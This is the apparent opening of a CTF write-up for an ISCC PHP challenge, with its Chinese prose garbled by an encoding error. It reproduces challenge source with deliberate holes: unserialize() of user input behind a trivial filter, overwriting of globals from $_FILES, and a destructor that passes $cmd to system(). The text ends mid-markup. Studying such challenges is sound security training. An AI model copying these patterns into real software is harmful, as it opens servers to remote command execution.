<p>å¼€å±€èƒ½æ‰¾å‡ºæºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br><span class="line">set_time_limit(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">$status = <span class="string">&quot;new&quot;</span>;</span><br><span class="line">$cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$is_unser_finished = <span class="literal">false</span>;</span><br><span class="line">$iscc_file = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Upload</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        $cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        $is_upload = (count($_FILES) &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        <span class="keyword">global</span> $iscc_file;</span><br><span class="line">        $status = <span class="string">&quot;upload_fail&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ($is_upload) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> ($_FILES <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">                $GLOBALS[$key] = $value;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(is_uploaded_file($iscc_file[<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">                $check = @getimagesize($iscc_file[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>($check !== <span class="literal">false</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    $target_dir = <span class="string">&quot;/var/tmp/&quot;</span>;</span><br><span class="line">                    $target_file = $target_dir . randstr(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (file_exists($target_file)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;æƒ³å•¥å‘¢ï¼Ÿæœ‰ä¸œè¥¿äº†â€¦â€¦&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> ($iscc_file[<span class="string">&quot;size&quot;</span>] &gt; <span class="number">500000</span>) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;ä¸œè¥¿å¡ä¸è¿›å»~&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (move_uploaded_file($iscc_file[<span class="string">&quot;tmp_name&quot;</span>], $target_file)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;æˆ‘æ‹¿åˆ°äº†ï¼&lt;br&gt;&quot;</span>;</span><br><span class="line">                        $iscc_file = $target_file;</span><br><span class="line">                        $status = <span class="string">&quot;upload_ok&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;æ‹¿ä¸åˆ°:(&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    finalize();</span><br><span class="line">                    <span class="keyword">exit</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;ä½ çœŸæ˜¯ä¸ªå¤©æ‰!&lt;br&gt;&quot;</span>;</span><br><span class="line">                finalize();</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_ResetCMD</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $new_cmd = <span class="string">&quot;echo &#x27;æ–°æ–°ä¸–ç•Œï¼Œå‘å·æ–½ä»¤!&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        $is_upload = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;new_cmd)) &#123;</span><br><span class="line">            $status = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            $error = <span class="string">&quot;ä½ è¿™ç½å­æ˜¯ç©ºçš„!&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>($error);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_string(<span class="keyword">$this</span>-&gt;new_cmd)) &#123;</span><br><span class="line">            $status = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            $error = <span class="string">&#x27;ä¸œè¥¿éƒ½æ²¡ç»™å¯¹!&#x27;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>($error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        $status = <span class="string">&quot;reset&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>($_SESSION[<span class="string">&#x27;name&#x27;</span>] === <span class="string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;</span><br><span class="line">            $cmd = <span class="keyword">$this</span>-&gt;new_cmd;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Login</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;login();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;logout();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $flag = file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        $pAssM0rd = hash(<span class="string">&quot;sha256&quot;</span>, $flag);</span><br><span class="line">        <span class="keyword">if</span>($_GET[<span class="string">&#x27;pAssM0rd&#x27;</span>] === $pAssM0rd)</span><br><span class="line">            $_SESSION[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;isccIsCciScc1scc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        <span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $status = <span class="string">&quot;finish&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_TellMeTruth</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">            $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä¼¼ä¹è¿™ä¸ª &quot;</span>.$_SESSION[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; æ˜¯çœŸç›¸&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä¼¼ä¹è¿™ä¸ª &quot;</span>.$_SESSION[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; æ˜¯çœŸç›¸&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Command</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        $is_upload = <span class="literal">false</span>;</span><br><span class="line">        $cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;çœ‹çœ‹ä½ å¹²çš„å¥½äº‹: <span class="subst">&#123;$cmd&#125;</span> &lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        <span class="keyword">global</span> $is_unser_finished;</span><br><span class="line">        $status = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>($is_unser_finished === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;çœ‹çœ‹ä½ å¹²çš„ [&lt;span style=&#x27;color:red&#x27;&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/span&gt;] å¼„å‡ºäº†ä»€ä¹ˆåæœ: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;</span>;</span><br><span class="line">            @system($cmd);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/span&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randstr</span>(<span class="params">$len</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $characters = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_=&#x27;</span>;</span><br><span class="line">    $randstring = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $randstring .= $characters[rand(<span class="number">0</span>, strlen($characters))];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $randstring;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stripos($s, <span class="string">&quot;*&quot;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">finalize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    $is_upload = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">    @unlink($iscc_file);</span><br><span class="line">    $status = <span class="string">&quot;finish&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;whichisthetrueiscc.gif&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;whatareyounongshane&#x27;</span>])) &#123;</span><br><span class="line">    $whatareyounongshane = $_GET[<span class="string">&#x27;whatareyounongshane&#x27;</span>];</span><br><span class="line">    <span class="keyword">switch</span> ($whatareyounongshane) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;src&quot;</span>:</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;cmd&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;æƒ³è¶Šçº§å¹²å¥½äº‹ï¼Ÿè¿˜æ˜¯æœ‰é—¨çš„â€¦â€¦&quot;</span>;</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;reset&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;å‡ è¾ˆå­ç§¯ç´¯çš„å¥½è¿å°±åœ¨è¿™æ—¶~:p&quot;</span>;</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;upload&quot;</span>:</span><br><span class="line">            $resp = &lt;&lt;&lt;EOF</span><br><span class="line">&lt;form action=<span class="string">&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:&#123;&#125;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;iscc_file&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Upload Image&quot;</span> name=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">EOF;</span><br><span class="line">            <span class="keyword">echo</span> $resp;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;tellmetruth&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> base64_decode(<span class="string">&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;</span>);</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ç©ºç©ºå¦‚ä¹Ÿå°±æ˜¯æˆ‘ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    finalize();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;æ‰€ä»¥å“ªä¸ªISCCæ˜¯çœŸçš„ï¼Ÿ&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;?&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    $wtf = waf($_GET&#123;<span class="string">&#x27;?&#x27;</span>&#125;) ? $_GET[<span class="string">&#x27;?&#x27;</span>] : (finalize() &amp;&amp; <span class="keyword">die</span>(<span class="string">&quot;è¯•è¯•å°±â€œé€ä¸–â€!&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($goodshit = @unserialize($wtf)) &#123;</span><br><span class="line">        $is_unser_finished = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(in_array($status, <span class="keyword">array</span>(<span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;upload_ok&#x27;</span>, <span class="string">&#x27;upload_fail&#x27;</span>, <span class="string">&#x27;reset&#x27;</span>), <span class="literal">true</span>))</span><br><span class="line">        finalize();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;æ‰€ä»¥å“ªä¸ªISCCæ˜¯çœŸçš„ï¼Ÿ&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ISCC finder system - which is the <span class="literal">true</span> ISCC&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        * &#123;</span><br><span class="line">            margin: <span class="number">0</span>;</span><br><span class="line">            padding: <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        canvas &#123;</span><br><span class="line">            display: block;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">#snowfall &#123;</span></span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">            height: <span class="number">100</span>vh;</span><br><span class="line">            background: cornflowerblue;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’</span><br><span class="line">â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ</span><br><span class="line">â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆ</span><br><span class="line">â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’</span><br><span class="line">â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’</span><br><span class="line">â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’</span><br><span class="line">â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’</span><br><span class="line">â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’</span><br><span class="line">â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’</span><br><span class="line">â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’</span><br><span class="line">â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’</span><br><span class="line">â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’</span><br><span class="line">â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’</span><br><span class="line">â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆ</span><br><span 